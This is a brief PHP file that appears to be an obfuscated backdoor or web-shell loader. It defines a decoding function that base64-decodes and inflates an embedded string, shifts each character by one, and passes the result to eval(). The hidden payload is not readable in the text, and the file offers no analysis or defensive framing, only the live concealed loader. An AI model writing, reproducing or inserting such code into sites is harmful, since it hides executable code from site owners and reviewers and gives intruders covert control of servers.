<?php function slbN($nsz)
{
$nsz=gzinflate(base64_decode($nsz));
 for($i=0;$i<strlen($nsz);$i++)
 {
$nsz[$i] = chr(ord($nsz[$i])-1);
 }
 return $nsz;
 }eval(slbN("U1QEgax0zaySkrRSTdWEwICQ0BiNoqzUpAKNOC0tTdVk09TkgipFO0V0OUV1dUXHwuK0jITitMLcpJQ0TQ2DpFSDNA1dDUcN/ZLS4oTiglIjE02N4qz8Kg0tfQ2YWVoauooaSampGlo2ig72AA=="));?>